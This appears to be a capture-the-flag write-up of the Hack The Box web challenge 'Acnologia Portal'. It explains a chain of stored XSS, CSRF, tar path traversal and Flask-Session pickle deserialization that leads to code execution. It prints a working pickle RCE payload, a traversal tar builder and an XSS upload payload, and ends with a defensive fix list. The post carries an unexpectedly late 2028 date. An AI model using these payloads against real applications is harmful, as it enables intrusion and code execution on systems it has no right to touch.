---
layout: post
title: "Acnologia Portal"
date: 2028-02-10 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, xss, csrf, zip-slip, path-traversal, pickle, deserialization, flask-session, rce]
---

## Overview

Acnologia Portal is a Medium Web challenge — a firmware portal with a Selenium admin bot that reviews user bug reports. Four weaknesses chain into remote code execution and a read of the setuid-root `/readflag`: stored XSS, a CSRF-able localhost-gated upload, a Zip Slip tar extraction, and a pickle-backed Flask session store.

## The chain

**1. Stored XSS.** `review.html` renders `{{ report.issue | safe }}` — no escaping. The admin bot logs in and visits `/review`, so a report's `issue` runs as script in the admin's browser.

**2. CSRF past a localhost gate.** `/api/firmware/upload` is guarded by `is_admin` = `current_user == 'admin' AND request.remote_addr == '127.0.0.1'`. Only the bot satisfies both — but the XSS *runs inside the bot*, so a same-origin `fetch()` with the admin cookie sails through.

**3. Zip Slip ([CVE-2007-4559](https://nvd.nist.gov/vuln/detail/CVE-2007-4559)).** `extract_firmware` does `tarfile.open(...).extractall('/tmp')` with no member-name sanitization, so a member named `../app/flask_session/<x>` [traverses](https://cwe.mitre.org/data/definitions/22.html) into `/app/flask_session` — the app user's writable directory.

**4. Flask-Session filesystem = [pickle](https://cwe.mitre.org/data/definitions/502.html).** With `SESSION_TYPE='filesystem'`, cachelib stores each session as `struct.pack("I", expires)` (4 bytes) + `pickle(value)`, keyed by `md5(sid)`, and loads it with `pickle` on every request. `SESSION_USE_SIGNER=False`, so the cookie value *is* the sid.

## Putting it together

Plant a malicious session file whose pickle runs the flag reader:

```python
class E:
    def __reduce__(self):
        return (os.system, ("/readflag > /app/application/static/acnoflag.txt 2>&1; chmod 666 ...",))
session_file = b"\x00\x00\x00\x00" + pickle.dumps(E(), protocol=0)   # expires=0 + pickle
```

Wrap it in a tar with a traversal member and deliver via the XSS:

```python
info = tarfile.TarInfo(name=f"../app/flask_session/{md5(SID)}")
info.size = len(session_file); tar.addfile(info, io.BytesIO(session_file))
```

```html
<img src=x onerror="var b='<B64_TAR>';var s=atob(b);var a=new Uint8Array(s.length);
for(var i=0;i<s.length;i++)a[i]=s.charCodeAt(i);
var fd=new FormData();fd.append('file',new Blob([a]),'fw.tar.gz');
fetch('/api/firmware/upload',{method:'POST',body:fd,credentials:'include'});">
```

Submit the report, let the bot upload and extract it, then request any page with `Cookie: session=<SID>`. Flask-Session loads `flask_session/md5(SID)` → `pickle.load` → RCE → `/readflag` output drops into the static dir. Fetch `/static/acnoflag.txt` for the flag. (The extractor's follow-up `os.rename` to the static dir fails on the traversal path and is swallowed by `except: pass`, so the planted file stays put.)

## Why it worked

`| safe` is stored XSS; the `remote_addr == 127.0.0.1` gate is meaningless when the trusted actor is a server-side bot whose origin and cookies the XSS borrows; `tarfile.extractall` honors `..`; and a pickle-backed session store turns any write into `flask_session/` into code execution.

## Fix / defense

- Escape user input — never `| safe` on report content.
- Don't authorize on `remote_addr`; use per-actor authz and anti-CSRF tokens.
- Sanitize archive members (reject `..`/absolute paths; use `tarfile`'s `data` filter) and confirm the resolved path stays inside the target dir.
- Don't use a pickle-backed session store for attacker-writable data; sign session files, use a non-pickle serializer, and lock down the session directory's permissions.
